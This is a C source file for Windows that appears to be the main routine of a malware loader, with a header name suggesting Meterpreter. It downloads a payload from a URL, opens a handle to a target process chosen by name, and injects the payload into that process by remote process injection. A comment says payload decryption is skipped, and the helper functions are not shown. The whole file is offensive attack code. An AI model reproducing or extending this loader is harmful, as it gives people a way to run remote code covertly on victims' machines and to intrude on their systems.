#include <stdio.h>
#include <Windows.h>
#include "../headers/meterweb.h"

int main()
{
	test();

	// Prepare
	PBYTE pPayloadBytes = NULL;
	SIZE_T sPayloadSize = NULL;
	HANDLE hProcess = NULL;
	DWORD dwPID = 0;

	// Pull the payload
	if (!GetPayloadFromUrl(PAYLOAD_URL, &pPayloadBytes, &sPayloadSize))
	{
		printf("[-] GetPayloadFromUrl failed: %d\n", GetLastError());
		exit(1);
	}
	printf("[+] GetPayloadFromUrl succeed :D\n");

	printf("[X] addr: 0x%2x\n", pPayloadBytes);
	printf("[X] size: %ld\n", sPayloadSize);
	// (skipped) Decrypt the payload
	// Get the remote process handle
	if (!GetRemoteProcessHandle(TARGETED_NAME, &dwPID, &hProcess))
	{
		printf("[-] GetRemoteProcessHandle failed: %d\n", GetLastError());
		exit(1);
	}
	printf("[+] GetRemoteProcessHandle succeed :D\n");
	
	printf("[X] PID: %d\n", dwPID);
	// Inject the payload
	if (!RemoteProcInj(pPayloadBytes, sPayloadSize, dwPID))
	{
		printf("[-] RemoteProcInj failed: %d\n", GetLastError());
		exit(1);
	}
	printf("[+] RemoteProcInj succeed :D\n");

	return 0;
}